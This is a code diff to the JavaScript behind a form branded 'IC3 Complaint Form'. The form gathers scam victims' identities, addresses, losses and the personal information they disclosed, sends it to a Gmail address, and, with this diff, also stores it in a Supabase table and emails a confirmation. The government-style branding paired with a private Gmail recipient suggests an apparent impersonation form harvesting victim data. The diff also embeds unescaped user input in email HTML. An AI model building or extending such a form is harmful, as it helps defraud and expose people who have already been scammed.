@@ -12,6 +12,10 @@
 var WEB3FORMS_ENDPOINT = "https://api.web3forms.com/submit";
 var ADMIN_EMAIL        = "icintertinecomplaint@gmail.com";
 
+const SUPABASE_URL = "https://hmfuppjdagkufqzwsbrr.supabase.co";
+const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImhtZnVwcGpkYWdrdWZxendzYnJyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODMwMTkzMTgsImV4cCI6MjA5ODU5NTMxOH0.nkrwlF_v_6HFFn89UGCbova_Zfo69GvN3TJbmMxF3Cg";
+const supabaseClient = window.supabase ? window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY) : null;
+
 
 /* ======================================================= */
 /* TOAST NOTIFICATION SYSTEM                               */
@@ -133,7 +137,7 @@ document.addEventListener("DOMContentLoaded", function () {
     payload.from_name = payload.fullname || "IC3 Complaint Form";
 
     try {
-
+      // 1. Send via Web3Forms (if still desired, though we now have Edge Functions. We will keep it for backwards compatibility)
       var response = await fetch(WEB3FORMS_ENDPOINT, {
         method:  "POST",
         headers: {
@@ -142,8 +146,46 @@ document.addEventListener("DOMContentLoaded", function () {
         },
         body: JSON.stringify(payload)
       });
-
       var result = await response.json();
+
+      // 2. Save to Supabase Database
+      if (supabaseClient) {
+        const { error: dbError } = await supabaseClient.from('complaints').insert([
+          {
+            fullname: payload.fullname,
+            email: payload.email,
+            phone: payload.phone,
+            businessName: payload.businessName,
+            gender: payload.gender,
+            affected: payload.affected,
+            country: payload.country,
+            state: payload.state,
+            city: payload.city,
+            address: payload.address,
+            zipcode: payload.zipcode,
+            category: payload.category,
+            scammethod: payload.scammethod,
+            timesscammed: payload.timesscammed,
+            timespaid: payload.timespaid,
+            lossamount: payload.lossamount,
+            scammerhandle: payload.scammerhandle,
+            datepaymentmade: payload.datepaymentmade,
+            personalinfosent: payload.personalinfosent
+          }
+        ]);
+        if (dbError) console.error("Error saving to Supabase:", dbError);
+      }
+
+      // 3. Trigger Confirmation Email via Edge Function
+      if (supabaseClient && payload.email) {
+        supabaseClient.functions.invoke("send-email", {
+          body: {
+            subject: "Confirmation: Complaint Received",
+            htmlBody: `<p>Dear ${payload.fullname},</p><p>We have successfully received your complaint regarding <b>${payload.category}</b>. Our team will review it and get back to you shortly.</p><p>Best regards,<br>IC3 Complaints Team</p>`,
+            toEmail: payload.email
+          }
+        }).catch(err => console.error("Error sending confirmation email:", err));
+      }
 
       if (response.ok && result.success) {
         /* ---- SUCCESS ---- */
